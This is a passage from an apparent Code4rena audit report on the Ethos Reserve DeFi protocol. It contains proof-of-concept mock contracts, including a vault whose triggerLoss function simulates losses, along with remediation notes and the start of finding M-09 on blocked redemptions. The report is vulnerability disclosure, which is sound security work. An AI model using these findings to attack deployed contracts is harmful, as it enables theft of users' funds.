class=\"mtk1\">.</span><span class=\"mtk12\">stabilityPoolSplit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">profit</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasurySplit</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stakingSplit</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stabilityPoolSplit</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stabilityPoolAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stabilityPoolSplit</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong>ReaperVaultV2.sol</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: BUSL-1.1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/access/AccessControlEnumerable.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/utils/math/Math.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">, </span><span class=\"mtk12\">AccessControlEnumerable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalAllocated</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IERC20Metadata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;test&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;TEST&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20Metadata</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">triggerLoss</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amt</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1337</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;No op&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">convertToAssets</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">_freeFunds</span><span class=\"mtk1\">()) / </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">balance</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">freeFunds</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_freeFunds</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balAfter</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">balAfter</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">balBefore</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">()) / </span><span class=\"mtk12\">freeFunds</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// use &quot;freeFunds&quot; instead of &quot;pool&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">balance</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) + </span><span class=\"mtk12\">totalAllocated</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// No harvest, so it&#39;s not going to make a difference</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_freeFunds</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">balance</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong>MockToken.sol</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: BUSL-1.1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MockToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Mock&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Mock&quot;</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1000e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"remediation-steps-2\" style=\"position:relative;\"><a href=\"#remediation-steps-2\" aria-label=\"remediation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Remediation Steps</h3>\n<p>A slashing mechanism would need to be added to account for a loss.</p>\n<p>This should be fairly involved as to not create gotchas.</p>\n<p>Intuitively, I believe, that the funds in the activePool would need to be mapped against the funds invested in Vaults as to reconcile the “deposited value” with the “slashed value”.</p>\n<p>Alternatively, for the time being, a “ShortFall” fund could be instituted, fully knowing that if something goes wrong, the fund will have to cover the loss.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/747#issuecomment-1468259920\">tess3rac7 (Ethos Reserve) disputed via duplicate issue <code>#747</code></a></strong></p>\n<hr>\n<h2 id=\"m-09-last-trove-may-be-prevented-from-redeeming\" style=\"position:relative;\"><a href=\"#m-09-last-trove-may-be-prevented-from-redeeming\" aria-label=\"m 09 last trove may be prevented from redeeming permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/381\">[M-09] Last Trove may be prevented from redeeming</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/381\">ltyu</a>, also found by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/549\">GalloDaSballo</a></em></p>\n<p>In <code>redeemCollateral()</code> of RedemptionHelper.sol, the LUSD <code>balanceOf</code> the redeemer is checked against the specific collateral recorded LUSD debt (both active and defaulted).</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">redeemCollateral</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_redeemer</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_LUSDamount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_firstRedemptionHint</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_upperPartialRedemptionHint</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_lowerPartialRedemptionHint</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_partialRedemptionHintNICR</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_maxIterations</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_maxFeePercentage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_requireCallerIsTroveManager</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_requireValidCollateralAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">RedemptionTotals</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totals</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_requireValidMaxFeePercentage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_maxFeePercentage</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_requireAfterBootstrapPeriod</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">totals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">priceFeed</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fetchPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ICollateralConfig</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralConfigCached</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">totals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfigCached</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">totals</span><span 